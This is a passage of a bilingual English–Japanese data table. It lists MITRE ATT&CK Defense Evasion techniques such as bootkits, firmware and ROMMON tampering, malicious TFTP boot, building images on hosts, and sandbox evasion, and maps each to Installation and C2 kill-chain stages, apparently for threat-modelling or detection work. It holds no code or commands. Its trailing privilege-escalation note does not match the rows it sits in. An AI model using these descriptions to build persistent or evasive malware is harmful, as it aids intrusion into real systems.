Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1542,OS起動前,Pre-OS Boot,"攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)

攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。","Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",T1542.003,ブートキット,Bootkit,"攻撃者はブートキットを使用してシステムに永続化する可能性があります。ブートキットは、ハードドライブのブートセクタを変更するマルウェアの亜種であり、コンピュータのオペレーティングシステムがロードされる前に悪意のあるコードを実行できるようにします。ブートキットはオペレーティングシステムより下のレイヤーに存在するため、組織が使用されたことを疑って適切に対応できない限り、完全な修復が困難になる可能性があります。

BIOSシステムでは、ブートキットはマスターブートレコード（MBR）および/またはボリュームブートレコード（VBR）を変更する可能性があります。(引用: Mandiant M Trends 2016) MBRは、BIOSによるハードウェア初期化の完了後に最初にロードされるディスクのセクションです。これはブートローダーの場所です。ブートドライブへのrawアクセス権を持つ攻撃者はこの領域を上書きし、起動中の実行を通常のブートローダーから攻撃者のコードに迂回させる可能性があります。(引用: Lau 2011)

MBRはブートプロセスの制御をVBRに渡します。MBRの場合と同様に、ブートドライブへのrawアクセス権を持つ攻撃者はVBRを上書きして、起動中の実行を攻撃者のコードに迂回させる可能性があります。

UEFI（Unified Extensible Firmware Interface）システムでは、ブートキットは代わりにEFIシステムパーティション（ESP）にファイルを作成または変更する可能性があります。ESPは、UEFIを含むデバイスで使用されるデータストレージ上のパーティションであり、システムがOSおよびシステムで使用されるその他のユーティリティを起動できるようにします。攻撃者はESPに新しく作成またはパッチが適用されたファイルを使用して、悪意のあるカーネルコードを実行できます。(引用: Microsoft Security)(引用: welivesecurity)","Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)

The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1542,OS起動前,Pre-OS Boot,"攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)

攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。","Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",T1542.005,TFTPブート,TFTP Boot,"攻撃者はネットブートを悪用して、Trivial File Transfer Protocol (TFTP) サーバーから不正なネットワークデバイスオペレーティングシステムをロードする可能性があります。TFTPブート (ネットブート) は、ネットワーク管理者が集中管理サーバーから構成制御されたネットワークデバイスイメージをロードするためによく使用されます。ネットブートはブートシーケンスのオプションの1つであり、デバイスイメージを集中管理、管理、制御するために使用できます。

攻撃者は、悪意のあるTFTPサーバーの使用を指定するネットワークデバイス上の構成を操作する可能性があり、これはデバイスの起動時またはリセット時に変更されたイメージをロードするために[システムイメージの変更](https://attack.mitre.org/techniques/T1601)と組み合わせて使用される可能性があります。不正なイメージにより、攻撃者はデバイス構成を変更したり、デバイスに悪意のある機能を追加したり、標準機能の使用を通じて検出を最小限に抑えながらネットワークデバイスの制御を維持するためのバックドアを導入したりすることができます。このテクニックは[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)に似ており、ネットワークデバイスが変更されたイメージを実行する結果になる可能性があります。(引用: Cisco Blog Legacy Device Attacks)","Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.

Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1542,OS起動前,Pre-OS Boot,"攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)

攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。","Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",T1542.002,コンポーネントファームウェア,Component Firmware,"攻撃者は、コンポーネントのファームウェアを変更してシステムに永続化する可能性があります。一部の攻撃者は、コンピュータコンポーネントを侵害し、オペレーティングシステムやメインシステムファームウェアまたはBIOSの外部で攻撃者のコードを実行する悪意のあるファームウェアをインストールするために、高度な手段を用いる場合があります。このテクニックは[システムファームウェア](https://attack.mitre.org/techniques/T1542/001)に似ている可能性がありますが、同じ機能や整合性チェックのレベルを持たない他のシステムコンポーネント/デバイスに対して実行される場合があります。

悪意のあるコンポーネントファームウェアは、アクセスを維持するための潜在的な一般的な障害やハードディスクの再イメージ化にもかかわらず、システムへの永続的なレベルのアクセスと、ホストソフトウェアベースの防御と整合性チェックを回避する方法の両方を提供する可能性があります。","Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.

Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1542,OS起動前,Pre-OS Boot,"攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)

攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。","Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",T1542.004,ROMMONキット,ROMMONkit,"攻撃者は、不正なファームウェアと攻撃者のコードをロードすることでROMモニタ（ROMMON）を悪用し、検出が困難な永続的なアクセスを提供し、デバイスの動作を操作する可能性があります。(引用: Cisco Synful Knock Evolution)(引用: Cisco Blog Legacy Device Attacks)

ROMMONは、プラットフォームの電源投入時またはリセット時にハードウェアとソフトウェアを初期化するためのブートローダー、ブートイメージ、またはブートヘルパーとして機能するCiscoネットワークデバイスファームウェアです。[TFTPブート](https://attack.mitre.org/techniques/T1542/005)と同様に、攻撃者は攻撃者のコードでROMMONイメージをローカルまたはリモート（例えばTFTP経由）でアップグレードし、デバイスを再起動して既存のROMMONイメージを上書きする可能性があります。これにより、攻撃者は検出が困難な方法でシステム上の永続性を得るためにROMMONを更新する手段を得ます。","Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)

ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1542,OS起動前,Pre-OS Boot,"攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)

攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。","Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",T1542.001,システムファームウェア,System Firmware,"攻撃者はシステムファームウェアを変更してシステムに永続化する可能性があります。BIOS（基本入出力システム）およびUnified Extensible Firmware Interface（UEFI）またはExtensible Firmware Interface（EFI）は、オペレーティングシステムとコンピュータのハードウェア間のソフトウェアインターフェイスとして動作するシステムファームウェアの例です。(引用: Wikipedia BIOS)(引用: Wikipedia UEFI)(引用: About UEFI)

BIOSや(U)EFIのようなシステムファームウェアは、コンピュータの機能の基礎となるものであり、悪意のある活動を実行したり支援したりするために、敵対者によって変更される可能性がある。システムファームウェアを上書きする機能が存在し、これにより高度な敵対者は、検出が困難なシステム上の永続性の手段として、悪意のあるファームウェアアップデートをインストールする手段を得ることができる。","Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)

System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1612,ホスト上でのイメージ構築,Build Image on Host,"攻撃者は、パブリックレジストリからの悪意のあるイメージの取得を監視する防御をバイパスするために、ホスト上で直接コンテナイメージを構築する可能性があります。リモートの<code>build</code>リクエストがDocker APIに送信される場合があり、これにはパブリックまたはローカルレジストリからalpineなどのバニラベースイメージをプルし、その上にカスタムイメージを構築するDockerfileが含まれます。(引用: Docker Build Image)

敵対者は、その<code>build</code> APIを利用して、C2サーバーからダウンロードしたマルウェアを含むカスタムイメージをホスト上に構築し、その後、そのカスタムイメージを使用して[コンテナのデプロイ](https://attack.mitre.org/techniques/T1610)を利用する可能性があります。(引用: Aqua Build Images on Hosts)(引用: Aqua Security Cloud Native Threat Report June 2021) ベースイメージがパブリックレジストリからプルされた場合、バニライメージであるため、防御側はイメージが悪意のあるものとして検出しない可能性が高いです。ベースイメージが既にローカルレジストリに存在する場合、イメージは既に環境内にあるため、プルはさらに疑わしくないと見なされる可能性があります。","Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)

An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1497,仮想化/サンドボックス回避,Virtualization/Sandbox Evasion,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな手段を用いる可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)

攻撃者は、セキュリティ監視ツール（Sysinternals、Wiresharkなど）や、分析または仮想化に関連するその他のシステムアーティファクトのチェックなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するためにいくつかの方法を使用する可能性があります。攻撃者はまた、正当なユーザーアクティビティをチェックして、分析環境にあるかどうかを判断するのに役立てることもあります。追加の方法には、一時的なサンドボックス内で動作することを避けるために、マルウェアコード内でスリープタイマーまたはループを使用することが含まれます。(引用: Unit 42 Pirpi July 2015)","Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",T1497.002,ユーザーアクティビティベースのチェック,User Activity Based Checks,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなユーザーアクティビティチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)

敵対者は、マウスの動きやクリックの速度/頻度(引用：Sans Virtual Jan 2016)、ブラウザの履歴、キャッシュ、ブックマーク、あるいはホームやデスクトップなどの共通ディレクトリ内のファイル数といった変数に基づいて、ホスト上のユーザー活動を検索するかもしれない。他の方法では、悪意のあるコードがアクティブ化される前にシステムとの特定のユーザーインタラクションに依存するかもしれず、例えば、マクロをアクティブ化する前にドキュメントが閉じるのを待ったり(引用：Unit 42 Sofacy Nov 2018)、アクティブ化するためにユーザーが埋め込み画像をダブルクリックするのを待ったりするなどです(引用：FireEye FIN7 April 2017)。","Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1497,仮想化/サンドボックス回避,Virtualization/Sandbox Evasion,"攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな手段を用いる可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)

